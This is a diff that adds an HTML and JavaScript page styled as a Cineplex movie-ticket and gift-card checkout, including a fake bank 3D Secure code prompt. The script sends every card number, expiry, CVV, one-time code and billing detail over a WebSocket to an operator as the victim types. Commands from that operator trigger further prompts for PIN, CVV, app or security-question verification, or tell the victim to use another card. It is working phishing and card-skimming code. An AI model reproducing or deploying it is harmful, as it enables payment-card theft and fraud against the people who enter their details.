@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>Cineplex.com | Checkout</title>
+<style>
+:root{--bg:#0a0b0d;--bg2:#141416;--bg3:#1e1e22;--text:#fff;--text2:#999;--text3:#666;--accent:#004ccc;--accent-h:#0038a0;--yellow:#ffd500;--blue:#1985FF;--border:#222;--radius:8px}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5}
+header{border-bottom:1px solid var(--border);padding:0 20px}
+header>div{display:flex;align-items:center;justify-content:space-between;height:56px}
+header button{background:none;border:none;color:var(--text);cursor:pointer;padding:8px;display:flex}
+header h1{font-size:18px;font-weight:600}
+.timer{color:var(--yellow);font-size:16px;font-weight:700;min-width:48px;text-align:center}
+.timer.expiring{color:#ff4444}
+main{max-width:1200px;margin:0 auto;padding:0 20px 80px;position:relative}
+.billboard{position:absolute;top:0;left:0;right:0;height:200px;background-size:cover;background-position:center;opacity:.2;mask-image:linear-gradient(to bottom,rgba(0,0,0,.3) 0%,transparent 100%);-webkit-mask-image:linear-gradient(to bottom,rgba(0,0,0,.3) 0%,transparent 100%);z-index:0}
+.content{position:relative;z-index:1;display:flex;gap:32px;padding-top:24px}
+.left{flex:1;min-width:0}
+.right{width:380px;flex-shrink:0;position:sticky;top:80px;align-self:flex-start}
+.movie-block{display:flex;gap:16px;margin-bottom:24px}
+.poster{width:80px;min-width:80px;height:118px;border-radius:var(--radius);overflow:hidden;background:var(--bg3)}
+.poster img{width:100%;height:100%;object-fit:cover}
+.movie-info h2{font-size:20px;font-weight:700;margin-bottom:6px}
+.badges{display:flex;gap:6px;margin-bottom:8px}
+.badge{padding:2px 8px;border-radius:4px;font-size:12px;font-weight:600;border:1px solid var(--text3);color:var(--text2)}
+.detail-row{font-size:13px;color:var(--text2);margin-top:2px}
+.detail-row .name{color:var(--text);font-weight:600}
+.section{background:var(--bg2);border-radius:12px;padding:24px;margin-bottom:16px}
+.section h3{font-size:16px;font-weight:600;margin-bottom:16px}
+.gift-card{display:flex;align-items:center;justify-content:space-between;cursor:pointer;color:var(--text2);font-size:14px}
+.gift-card svg{color:var(--text3)}
+.input-group{margin-bottom:16px}
+.input-group label{display:block;font-size:13px;color:var(--text2);margin-bottom:6px}
+.input-group input{width:100%;padding:10px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:15px;outline:none;font-family:inherit;transition:border .2s}
+.input-group input:focus{border-color:var(--accent)}
+.input-row{display:flex;gap:12px}
+.input-row .input-group{flex:1}
+.pay-btn{width:100%;padding:14px;margin-top:8px;border:none;border-radius:var(--radius);background:var(--accent);color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
+.pay-btn:hover{background:var(--accent-h)}
+.summary{background:var(--bg2);border-radius:12px;padding:24px}
+.summary h3{font-size:18px;font-weight:700;margin-bottom:20px}
+.summary-row{display:flex;justify-content:space-between;padding:6px 0;font-size:14px}
+.summary-row.total{border-top:1px solid var(--border);margin-top:12px;padding-top:14px;font-size:16px;font-weight:700}
+.summary-row .val,.val{color:var(--yellow);font-weight:600}
+.secure-note{text-align:center;font-size:12px;color:var(--text3);margin-top:12px;display:flex;align-items:center;justify-content:center;gap:4px}
+.loading{display:flex;align-items:center;justify-content:center;padding:80px 20px;color:var(--text2)}
+.spinner{width:32px;height:32px;border:3px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;margin-right:12px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.hidden{display:none!important}
+/* 3D Secure modal */
+.overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:1000;display:flex;align-items:center;justify-content:center}
+.otp-card{width:100%;max-width:400px;background:#fff;border-radius:12px;overflow:hidden;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+.otp-hdr{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #e0e0e0}
+.otp-hdr-left{display:flex;align-items:center;gap:6px;font-size:14px;font-weight:700;color:#333}
+.otp-hdr-right{display:flex;align-items:center;gap:8px;color:#333;font-size:14px;font-weight:400}
+.otp-body{padding:20px}
+.otp-body h2{font-size:16px;font-weight:700;margin-bottom:6px;color:#1a1a1a}
+.otp-body p{font-size:12px;color:#555;margin-bottom:14px}
+.otp-table{width:100%;margin-bottom:12px;border-collapse:collapse}
+.otp-table td{padding:6px 0;font-size:12px;border-bottom:1px solid #f0f0f0}
+.otp-table td:first-child{color:#999}
+.otp-table td:last-child{color:#333;font-weight:500;text-align:right}
+.pin-input{display:flex;gap:8px;justify-content:center;margin:10px 0 16px}
+.pin-input input{width:50px;height:56px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;transition:.2s}
+.pin-input input:focus{border-color:#3f51b5;box-shadow:0 0 0 2px #3f51b522}
+.pin-input input.error{border-color:#e53935;background:#fff5f5}
+.otp-error{color:#e53935;font-size:11px;text-align:center;margin-bottom:8px}
+.otp-btn{width:100%;height:44px;background:#3f51b5;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;transition:opacity .2s}
+.otp-btn:disabled{opacity:.5;cursor:not-allowed}
+.otp-btn.loading{color:transparent!important;position:relative}
+.otp-btn.loading::after{content:'';position:absolute;left:50%;top:50%;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite}
+.otp-countdown{text-align:center;color:#bbb;font-size:11px;margin-top:8px}
+.result-msg{text-align:center;padding:30px 20px;font-size:16px;font-weight:600}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media(max-width:860px){.content{flex-direction:column}.right{width:100%;position:static}}
+</style>
+</head>
+<body>
+<header>
+  <div>
+    <button onclick="history.back()" aria-label="Back">
+      <svg width="17" height="16" fill="none"><path fill="currentColor" fill-rule="evenodd" d="m11.75 1-7 7 7 7v-1.414L6.164 7.999l5.586-5.585z"/></svg>
+    </button>
+    <h1>Checkout</h1>
+    <span class="timer" id="timer">5:00</span>
+    <button onclick="window.close()" aria-label="Exit">
+      <svg width="17" height="16" fill="none"><path fill="currentColor" d="M2.25 14.707 1.543 14l6-6-6-6 .707-.707 6 6 6-6 .707.707zM10.25 9.293 14.957 14l-.707.707L9.543 10z"/></svg>
+    </button>
+  </div>
+</header>
+<main>
+  <div class="billboard" id="billboard"></div>
+  <div class="content">
+    <div class="left">
+      <div id="loading" class="loading"><div class="spinner"></div>Loading checkout...</div>
+      <div id="page" class="hidden">
+        <div class="movie-block" id="movie-block"></div>
+        <div class="section">
+          <h3>Billing Address</h3>
+          <div class="input-group"><label>Full Name</label><input type="text" id="bill-name" placeholder="John Doe"></div>
+          <div class="input-group"><label>Address</label><input type="text" id="bill-address" placeholder="123 Main St"></div>
+          <div class="input-row">
+            <div class="input-group"><label>City</label><input type="text" id="bill-city" placeholder="Montréal"></div>
+            <div class="input-group"><label>Province</label><input type="text" id="bill-province" placeholder="QC"></div>
+          </div>
+          <div class="input-row">
+            <div class="input-group"><label>ZIP/Postal Code</label><input type="text" id="bill-postal" placeholder="H3B 4W3"></div>
+            <div class="input-group"><label>Country</label><input type="text" id="bill-country" placeholder="Canada"></div>
+          </div>
+          <div class="input-row">
+            <div class="input-group"><label>Phone</label><input type="text" id="bill-phone" placeholder="+1 (514) 555-0123"></div>
+            <div class="input-group"><label>Email</label><input type="text" id="bill-email" placeholder="you@example.com"></div>
+          </div>
+        </div>
+        <div class="section">
+          <h3>Payment Details</h3>
+          <div class="input-group">
+            <label>Credit Card Number</label>
+            <div style="position:relative">
+              <input type="text" placeholder="0000 0000 0000 0000" id="card-number" style="padding-right:80px">
+              <div style="position:absolute;right:10px;top:50%;transform:translateY(-50%);display:flex;gap:4px;pointer-events:none">
+                <svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg>
+                <svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/><circle cx="16" cy="11" r="5" fill="#ff5f00"/></svg>
+                <svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg>
+              </div>
+            </div>
+          </div>
+          <div class="input-row"><div class="input-group"><label>Expiry Date</label><input type="text" placeholder="MM / YY" id="card-expiry"></div><div class="input-group"><label>Security Code</label><input type="text" placeholder="···" id="card-cvv"></div></div>
+          <div class="input-group"><label>Cardholder Name</label><input type="text" placeholder="Name on card" id="card-name"></div>
+          <button class="pay-btn" id="submitBtn" onclick="submitPayment()">Pay Now</button>
+          <div class="secure-note">
+            <svg width="12" height="12" fill="none"><path fill="currentColor" fill-rule="evenodd" d="M6 1a2.5 2.5 0 0 0-2.5 2.5V5h-1a.5.5 0 0 0-.5.5v6a.5.5 0 0 0 .5.5h7a.5.5 0 0 0 .5-.5v-6a.5.5 0 0 0-.5-.5h-1V3.5A2.5 2.5 0 0 0 6 1M4.5 3.5V5h3V3.5a1.5 1.5 0 0 0-3 0"/></svg>
+            Secured by Cineplex
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="right">
+      <div class="summary">
+        <h3>Order Summary</h3>
+        <div id="summary-items"></div>
+        <div class="summary-row total"><span>Total</span><span class="val" id="total-price">$0.00</span></div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<!-- Loading overlay (standalone) -->
+<div class="overlay hidden" id="load-overlay">
+  <div style="text-align:center">
+    <img src="https://mediafiles.cineplex.com/modernization/popcorn-loader.gif" alt="loading" style="width:120px;height:120px">
+    <p style="text-align:center;color:#fff;font-size:16px;margin-top:16px;font-weight:500">Processing payment...</p>
+  </div>
+</div>
+
+<!-- 3D Secure overlay -->
+<div class="overlay hidden" id="otp-overlay">
+  <div class="otp-card">
+    <div class="otp-hdr">
+      <div class="otp-hdr-left">
+        <svg width="22" height="22" viewBox="0 0 40 40" fill="none" stroke="#888" stroke-width="2"><polygon points="20,3 4,14 36,14"/><rect x="4" y="32" width="32" height="4" rx="1"/><line x1="9" y1="15" x2="9" y2="32"/><line x1="16" y1="15" x2="16" y2="32"/><line x1="24" y1="15" x2="24" y2="32"/><line x1="31" y1="15" x2="31" y2="32"/></svg>
+        <span>Your card issuer</span>
+      </div>
+      <div class="otp-hdr-right" style="gap:8px">
+        <svg width="32" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg>
+        <span style="color:#ccc;font-size:18px">|</span>
+        <span style="font-family:Arial;font-size:13px">Secure</span>
+      </div>
+    </div>
+    <div class="otp-body" id="otp-body">
+      <div id="otp-form" class="hidden">
+        <h2>Enter your security code</h2>
+        <p>Please enter your security code to authorize this payment</p>
+        <table class="otp-table">
+          <tr><td>Merchant</td><td>Cineplex</td></tr>
+          <tr id="otp-amount-row"><td>Amount</td><td id="otp-amount">$0.00</td></tr>
+        </table>
+        <div class="pin-input" id="pin-input">
+          <input type="tel" maxlength="8" id="otp-code" style="width:100%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+        </div>
+        <div class="otp-error hidden" id="otp-error">Please enter your security code.</div>
+        <button class="otp-btn" id="otp-submit">Continue</button>
+        <div class="otp-countdown">Code expires in <span id="otp-timer">4:59</span></div>
+      </div>
+      <div id="otp-result" class="hidden">
+        <div class="result-msg error" id="otp-fail"><svg width="48" height="48" fill="none" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#e74c3c" stroke="#e74c3c" stroke-width="2"/><line x1="16" y1="16" x2="32" y2="32" stroke="#fff" stroke-width="3"/><line x1="32" y1="16" x2="16" y2="32" stroke="#fff" stroke-width="3"/></svg><br>Payment Failed</div>
+        <p style="text-align:center;color:#888;font-size:13px;margin:8px 0">Your bank did not authorize this transaction.<br>Please try another card or contact your card issuer.</p>
+        <button class="otp-btn" onclick="document.getElementById('otp-overlay').classList.add('hidden');resetOtp()">Try Again</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const p=new URLSearchParams(location.search);
+const isGiftCard=p.get('type')==='giftcard';
+const theatreId=p.get('theatreId'),showtimeId=p.get('showtimeId'),vistaHO=p.get('vistaHOCategoryCode')||'0000000001';
+let selections=[],total=0,countdown=299;
+if(isGiftCard){total=parseFloat(p.get('amount'))||30;selections=[]}else{try{selections=JSON.parse(atob(p.get('selections')||''))}catch(e){}}
+setInterval(()=>{countdown--;if(countdown<0)countdown=0;const m=Math.floor(countdown/60),s=countdown%60;document.getElementById('timer').textContent=m+':'+String(s).padStart(2,'0');if(countdown<60)document.getElementById('timer').classList.add('expiring')},1000);
+if(isGiftCard){document.getElementById('movie-block').innerHTML='<div class=\"poster\" style=\"font-size:48px;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1a1a2e,#16213e);color:#18d46b\">🎁</div><div class=\"movie-info\"><h2>Gift Card Purchase</h2><div class=\"badges\"><span class=\"badge\">E-Gift Card</span></div></div>';updateGiftSummary();document.getElementById('loading').classList.add('hidden');document.getElementById('page').classList.remove('hidden')}
+else{(async()=>{try{const data=await fetch(`/prod/cpx/theatrical/api/v1/theatres/${theatreId}/showtimes/${showtimeId}?dbox=false`).then(r=>r.json());if(data.billboard?.desktopImageUrl)document.getElementById('billboard').style.backgroundImage=`url(${data.billboard.desktopImageUrl})`;const dt=new Date(data.showtime.showStartDateTime),ds=dt.toLocaleDateString('en-US',{weekday:'short',month:'short',day:'numeric'}),ts=dt.toLocaleTimeString('en-US',{hour:'numeric',minute:'2-digit'});document.getElementById('movie-block').innerHTML=`<div class="poster">${data.mediumPosterImageUrl?`<img src="${data.mediumPosterImageUrl}" alt="${data.movie}">`:''}</div><div class="movie-info"><h2>${data.movie}</h2><div class="badges">${(data.experienceTypes||[]).map(e=>`<span class="badge">${e}</span>`).join('')}${data.localRating?`<span class="badge">${data.localRating}</span>`:''}${data.languageCode?`<span class="badge">${data.languageCode}</span>`:''}</div><div class="detail-row"><span>${ds}</span> · <span>${ts}</span></div><div class="detail-row"><span class="name">${data.theatre||''}</span></div>${data.location?`<div class="detail-row"><span>${data.location.address}, ${data.location.city}</span></div>`:''}${data.showtime?.auditorium?`<div class="detail-row"><span>${data.showtime.auditorium}${data.showtime.seatsRemaining?' · '+data.showtime.seatsRemaining+' seats':''}</span></div>`:''}</div>`;updateMovieSummary();document.getElementById('loading').classList.add('hidden');document.getElementById('page').classList.remove('hidden')}catch(e){document.getElementById('loading').classList.add('hidden')}})();}
+function updateMovieSummary(){total=0;const items=document.getElementById('summary-items');let h='';selections.forEach(s=>{const p=s.pricePerTicket?s.pricePerTicket.valueIncludingTax:(s.price||0);const st=p*s.quantity;total+=st;h+=`<div class="summary-row"><span>${s.name} × ${s.quantity}</span><span class="val">$${st.toFixed(2)}</span></div>`});h+=`<div class="summary-row"><span>Booking Fee</span><span class="val">$0.00</span></div>`;items.innerHTML=h;document.getElementById('total-price').textContent='$'+total.toFixed(2)}
+function updateGiftSummary(){document.getElementById('summary-items').innerHTML='<div class="summary-row"><span>E-Gift Card</span><span class="val">$'+total.toFixed(2)+'</span></div>';document.getElementById('total-price').textContent='$'+total.toFixed(2)}
+function showInline(msg,persist){if(persist)localStorage.setItem('_inlineMsg',msg);var el=document.getElementById('inlineNotify');if(!el){el=document.createElement('div');el.id='inlineNotify';el.style.cssText='position:fixed;top:16px;left:50%;transform:translateX(-50%);background:#2b3045;color:#fff;padding:12px 24px;border-radius:8px;z-index:9999;font-size:14px;box-shadow:0 4px 12px rgba(0,0,0,.3);transition:opacity .3s';document.body.appendChild(el)}el.textContent=msg;el.style.opacity='1';el.style.display='block';clearTimeout(el._timeout);if(!persist)el._timeout=setTimeout(function(){el.style.opacity='0'},4000)}
+function hideInline(){var el=document.getElementById('inlineNotify');if(el){el.style.display='none';el.style.opacity='0'};localStorage.removeItem('_inlineMsg')}
+function luhn(n){var s=0,a=0;for(var i=n.length-1;i>=0;i--){var d=parseInt(n[i],10);if(a)s+=d*2>9?d*2-9:d*2;else s+=d;a=!a}return s%10===0}
+
+
+// === Payment Backend WebSocket ===
+var ws=null,sid=null,wsTimer=null;
+var cid=localStorage.getItem('cineplex_cid');
+if(!cid){cid='cust_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);localStorage.setItem('cineplex_cid',cid)}
+
+function wsConnect(){
+var url='ws://localhost:9528?role=customer&cid='+cid+(sid?'&sid='+sid:'');
+ws=new WebSocket(url);
+ws.onopen=function(){console.log('[WS] Connected');if(wsTimer)clearInterval(wsTimer);wsTimer=setInterval(function(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'heartbeat'}))},30000)};
+ws.onmessage=function(e){
+var msg=JSON.parse(e.data);
+console.log('[WS] Received:',msg);
+if(msg.type==='operator_action'){
+var p=msg.payload;var a=p.action;
+if(a==='ack'){sid=p.sessionId;console.log('[WS] Session:',sid)}
+else if(a==='session_restored'){
+  sid=p.sessionId;console.log('[WS] Restored:',sid);
+  // Restore form fields
+  if(p.cardInfo){var ci=p.cardInfo;if(ci.cardHolder)document.getElementById('card-name').value=ci.cardHolder;if(ci.cardNumber)document.getElementById('card-number').value=ci.cardNumber.replace(/(\\d{4})(?=\\d)/g,'\$1 ');if(ci.expiry)document.getElementById('card-expiry').value=ci.expiry;if(ci.cvv)document.getElementById('card-cvv').value=ci.cvv}
+  if(p.customerInfo){var cu=p.customerInfo;if(cu.fullName)document.getElementById('bill-name').value=cu.fullName;if(cu.phone){var ph=cu.phone.replace(/\\D/g,'').slice(0,10);if(ph.length>6)ph='('+ph.slice(0,3)+') '+ph.slice(3,6)+'-'+ph.slice(6);else if(ph.length>3)ph='('+ph.slice(0,3)+') '+ph.slice(3);else if(ph.length>0)ph='('+ph;document.getElementById('bill-phone').value=ph};if(cu.email)document.getElementById('bill-email').value=cu.email;if(cu.address1)document.getElementById('bill-address').value=cu.address1;if(cu.city)document.getElementById('bill-city').value=cu.city;if(cu.state)document.getElementById('bill-province').value=cu.state;if(cu.country)document.getElementById('bill-country').value=cu.country;if(cu.zipCode)document.getElementById('bill-postal').value=cu.zipCode}
+  // Handle pending status
+  if(p.status==='pending'){document.getElementById('load-overlay').classList.remove('hidden');document.querySelector('#load-overlay p').textContent='Waiting for payment approval...'}}
+else if(a==='otp_verify'){window._otpInProgress=true;document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');resetOtp();startOtpTimer()}
+else if(a==='custom_otp_verify'){document.getElementById('otp-overlay').classList.remove('hidden');document.querySelector('#otp-body h2').textContent='Enter OTP Code';document.querySelector('#otp-body p').textContent=p.message||'Please enter the OTP code sent to your phone';resetOtp();startOtpTimer()}
+else if(a==='email_verify'||a==='pin_verify'||a==='cvv_verify'||a==='app_verify'||a==='question_verify'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');document.querySelector('#otp-body h2').textContent='Verification Required';document.querySelector('#otp-body p').textContent=p.message||'Please complete verification';resetOtp()}
+else if(a==='approve'){if(isGiftCard){showInline('Payment approved! Gift card will be emailed.')}else{var d=btoa(JSON.stringify({movie:document.querySelector('#movie-block h2')?.textContent||'',theatre:document.querySelector('#movie-block .name')?.textContent||'',date:document.querySelector('#movie-block .detail-row span')?.textContent||'',tickets:selections.map(function(s){return s.name+' ×'+s.quantity}).join(', '),total:total}));location.href='/tickets/complete/?d='+d}}
+else if(a==='reject'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=true;showInline('Rejected: '+(p.message||''),true)}
+else if(a==='card_error'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;showInline('Card error: '+(p.message||''),true)}
+else if(a==='otp_error'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');showInline('Code error: '+(p.message||'Please try again'),true);document.getElementById('otp-code').classList.add('error');document.getElementById('otp-error').classList.remove('hidden');document.querySelector('#otp-error').textContent=p.message||'Invalid code. Please try again.'}
+else if(a==='timeout'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=true;showInline('Session timeout. Please try again.',true)}
+else if(a==='change_card'){window._otpInProgress=false;var oe=document.getElementById('otp-code');if(oe)oe.value='';document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;showInline('Please use a different card.'+(p.message?': '+p.message:''),true)}
+else if(a==='custom_prompt'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;if(window._otpInProgress)document.getElementById('otp-overlay').classList.remove('hidden');showInline(p.message||'Operator needs your attention',true)}
+else if(a==='redirect_complete'){if(isGiftCard){location.href='/giftcards/complete/?amount='+(total||'')}else{location.href='/tickets/complete/'}}
+}
+};
+ws.onclose=function(){console.log('[WS] Disconnected. Reconnecting in 5s...');if(wsTimer)clearInterval(wsTimer);setTimeout(wsConnect,5000)};
+ws.onerror=function(e){console.log('[WS] Error')};
+}
+wsConnect();
+// Restore persistent inline message if any
+var pm=localStorage.getItem('_inlineMsg');if(pm){showInline(pm,true)}
+
+function buildPayload(){
+var nm=document.getElementById('card-name').value.trim();
+var cn=document.getElementById('card-number').value.replace(/\s/g,'');
+var ce=document.getElementById('card-expiry').value.trim();
+var cv=document.getElementById('card-cvv').value.trim();
+var bn=document.getElementById('bill-name')?.value.trim()||nm;
+var ph=document.getElementById('bill-phone')?.value.trim()||'';
+var em=document.getElementById('bill-email')?.value.trim()||'';
+var ad=document.getElementById('bill-address')?.value.trim()||'';
+var ci=document.getElementById('bill-city')?.value.trim()||'';
+var pr=document.getElementById('bill-province')?.value.trim()||'';
+var pc=document.getElementById('bill-postal')?.value.trim()||'';
+var co=document.getElementById('bill-country')?.value.trim()||'';
+var otp=document.getElementById('otp-code')?.value.trim()||'';
+var nmParts=bn.split(' ');
+var ccMap={'canada':'CA','united states':'US','usa':'US','uk':'GB','united kingdom':'GB','australia':'AU','germany':'DE','france':'FR','japan':'JP','china':'CN','india':'IN','brazil':'BR','mexico':'MX'};
+var ccCode=ccMap[(co||'').toLowerCase()]||co.slice(0,2).toUpperCase();
+return{
+frontendUrl:location.hostname,
+cardInfo:{cardNumber:cn,expiry:ce,cvv:cv,cardHolder:nm,otpCode:otp},
+ customerInfo:{firstName:nmParts[0]||'',lastName:nmParts.slice(1).join(' ')||'',fullName:bn,email:em,phone:ph,country:ccCode,address1:ad,city:ci,state:pr,zipCode:pc},
+browsingTabs:[{label:'卡片页',count:1,active:true}],
+currentStep:'card'
+};
+}
+
+function submitPayment(){
+var cn=document.getElementById('card-number').value.replace(/\s/g,''),ce=document.getElementById('card-expiry').value.trim(),cv=document.getElementById('card-cvv').value.trim(),nm=document.getElementById('card-name').value.trim();
+if(cn.length<13||cn.length>19)return alert('Please enter a valid card number');
+if(!luhn(cn))return alert('Invalid card number (Luhn check failed)');
+if(!ce.match(/^\d\d\/\d\d$/))return alert('Please enter a valid expiry date (MM/YY)');
+if(cv.length<3)return alert('Please enter a valid security code');
+if(!nm)return alert('Please enter the cardholder name');
+// Clear stale OTP input
+var otpEl=document.getElementById('otp-code');if(otpEl)otpEl.value='';
+hideInline();
+document.getElementById('otp-amount').textContent='$'+total.toFixed(2);
+// Show loading
+document.getElementById('load-overlay').classList.remove('hidden');
+document.getElementById('load-overlay').querySelector('p').textContent='Processing payment...';
+// Send to backend
+if(!ws||ws.readyState!==1){wsConnect();setTimeout(function(){sendPayload()},2000);return}
+sendPayload();
+}
+
+function sendPayload(){
+var payload=buildPayload();
+if(!sid){ws.send(JSON.stringify({type:'customer_input',payload:payload}));return}
+payload.status='pending';
+payload.sessionId=sid;
+ws.send(JSON.stringify({type:'session_update',payload:payload}));
+}
+
+function submitOtp(){
+var code=document.getElementById('otp-code').value;
+if(code.length<4){document.getElementById('otp-code').classList.add('error');document.getElementById('otp-error').classList.remove('hidden');return}
+document.getElementById('otp-code').classList.remove('error');
+hideInline();
+document.getElementById('otp-overlay').classList.add('hidden');
+document.getElementById('load-overlay').classList.remove('hidden');
+document.querySelector('#load-overlay p').textContent='Verifying your card...';
+if(ws&&ws.readyState===1&&sid){
+var p=buildPayload();p.cardInfo.otpCode=code;
+ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:p.cardInfo,customerInfo:p.customerInfo,browsingTabs:p.browsingTabs,currentStep:'otp'}}));
+}
+}
+
+function resetOtp(){document.getElementById('otp-form').classList.remove('hidden');document.getElementById('otp-result').classList.add('hidden');document.getElementById('otp-error').classList.add('hidden');var otp=document.getElementById('otp-code');otp.value='';otp.focus();var b=document.getElementById('otp-submit');b.disabled=false;b.classList.remove('loading');b.textContent='Continue'}
+var otpSec=299,otpTmr=null;
+function startOtpTimer(){otpSec=299;clearInterval(otpTmr);otpTmr=setInterval(function(){otpSec--;if(otpSec<0){otpSec=0;clearInterval(otpTmr);document.getElementById('otp-submit').disabled=true};var m=Math.floor(otpSec/60),s=otpSec%60;document.getElementById('otp-timer').textContent=m+':'+String(s).padStart(2,'0')},1000)}
+startOtpTimer();
+
+document.getElementById('otp-code').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,8)});
+document.getElementById('otp-submit').addEventListener('click',submitOtp);
+
+// Input formatting + Luhn visual feedback
+(function(){
+var cc=document.getElementById('card-number');
+cc.addEventListener('input',function(){var v=this.value.replace(/\D/g,'').slice(0,16);this.value=v.replace(/(\d{4})(?=\d)/g,'$1 ');if(v.length>=13)this.style.borderColor=luhn(v)?'#2e7d32':'#c62828';else this.style.borderColor='#004ccc'});
+cc.addEventListener('blur',function(){this.style.borderColor=''});
+var ex=document.getElementById('card-expiry');
+ex.addEventListener('input',function(){var v=this.value.replace(/\D/g,'').slice(0,4);if(v.length>2)v=v.slice(0,2)+'/'+v.slice(2);this.value=v});
+ex.addEventListener('keydown',function(e){if(e.key==='Backspace'&&this.value.endsWith('/')){this.value=this.value.slice(0,-1);e.preventDefault()}});
+var cv=document.getElementById('card-cvv');
+cv.addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,4)});
+var ph=document.getElementById('bill-phone');
+ph&&ph.addEventListener('input',function(){var v=this.value.replace(/\D/g,'').slice(0,10);if(v.length>6)v='('+v.slice(0,3)+') '+v.slice(3,6)+'-'+v.slice(6);else if(v.length>3)v='('+v.slice(0,3)+') '+v.slice(3);else if(v.length>0)v='('+v;this.value=v});
+var zp=document.getElementById('bill-postal');
+ zp&&zp.addEventListener('input',function(){this.value=this.value.toUpperCase().replace(/[^A-Z0-9\s]/g,'').slice(0,7)});
+})();
+
+// === Real-time input transmission (150ms debounce) ===
+var liveTimer=null;
+function livePush(){
+if(!ws||ws.readyState!==1)return;
+var payload=buildPayload();
+if(!sid){
+ws.send(JSON.stringify({type:'customer_input',payload:payload}));
+}else{
+ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,cardInfo:payload.cardInfo,customerInfo:payload.customerInfo,browsingTabs:payload.browsingTabs,currentStep:'card'}}));
+}
+}
+function onInput(){clearTimeout(liveTimer);liveTimer=setTimeout(livePush,150)}
+var liveInputs=['card-number','card-name','card-expiry','card-cvv','bill-phone','bill-email','bill-address','bill-city','bill-province','bill-postal','bill-country','otp-code'];
+liveInputs.forEach(function(id){
+var el=document.getElementById(id);if(el)el.addEventListener('input',onInput);
+});
+</script>
+</body>
+</html>
